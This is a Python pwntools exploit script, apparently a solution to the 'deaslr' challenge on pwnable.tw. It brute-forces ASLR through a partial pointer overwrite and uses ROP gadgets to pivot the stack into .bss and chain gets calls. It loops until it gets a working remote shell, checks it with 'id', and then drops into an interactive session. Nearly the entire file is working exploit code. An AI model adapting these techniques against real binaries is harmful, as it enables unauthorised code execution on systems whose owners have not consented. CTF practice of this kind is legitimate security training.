from pwn import *
import signal

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
class Program_Exception(Exception):
        pass
count = 0

while 1:
        try:
                count += 1
                print('[+] Try:'+ str(count))
                #p = process('./deaslr',env={'LD_PRELOAD':'./libc_64.so.6'})
                p = remote('chall.pwnable.tw',10402)
                bin = ELF('./deaslr')
                #context.log_level = 'debug'

                #gdb.attach(p,'''break *0x40054a
                #''')
                bss = 0x601000
                pop_rsp_r13_r14_r15 = 0x4005bd
                gets_plt = 0x400430
                pop_rdi = 0x4005c3
                pop_rsi_r15 = 0x4005c1
                add_ebx_esi = 0x400509
                pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ba
                push_rbx = 0x40057a
                ret = 0x4003f9
                pop_r14_r15 = 0x4005c0

                #pause()

                #rm stack
                payload1 = 'A'*24+p64(pop_rdi)+p64(bss+0x2a0)+p64(gets_plt)
                payload1 += p64(pop_rsp_r13_r14_r15)+p64(bss+0x288)
                p.sendline(payload1)
                p.sendline(p64(bin.sym['main']))

                #rm stack
                payload2 = 'B'*24+p64(pop_rdi)+p64(bss+0x5a0)+p64(gets_plt)
                payload2 += p64(pop_rsp_r13_r14_r15)+p64(bss+0x588)
                p.sendline(payload2)
                p.sendline(p64(bin.sym['main']))

                #write into 0x601298 pop rbx rbp r12 r13 r14 r15; ret
                #write into 0x6012a8 'B'*40 pop rsi; r15; ret; add ebx, esi; ret; push rbx ...
                #rm stack into 0x601280
                payload3 = 'C'*24+p64(pop_rdi)+p64(bss+0x298)+p64(gets_plt)
                payload3 += p64(pop_rdi)+p64(bss+0x2a8)+p64(gets_plt)
                payload3 += p64(pop_rsp_r13_r14_r15)+p64(bss+0x280)
                p.sendline(payload3)
                p.sendline(p64(pop_rbx_rbp_r12_r13_r14_r15))
                payload4 = 'B'*40
                payload4 += p64(pop_rsi_r15)+p64(0xffffffffffffffff-0x29b96+1)+p64(0)
                payload4 += p64(add_ebx_esi)+p64(push_rbx)+p64(0)*5
                payload4 += p64(pop_r14_r15)+p64(0)+p64(0)+p64(ret)*0x30
                payload4 += p64(pop_rdi)+p64(bss+0x2f0+0x4)+p64(gets_plt)
                payload4 += p64(pop_rsp_r13_r14_r15)+p64(bss+0x2d8)
                p.sendline(payload4)
                p.sendline('\xc4\x7f')
                p.recvline(timeout=2)
                p.sendline('id')

                if p.recvuntil('id',timeout=1):
                        p.interactive()
                else:
                        p.close()

        except (Program_Exception,EOFError) as bin:
                print "EOFError"
                p.close()
                continue
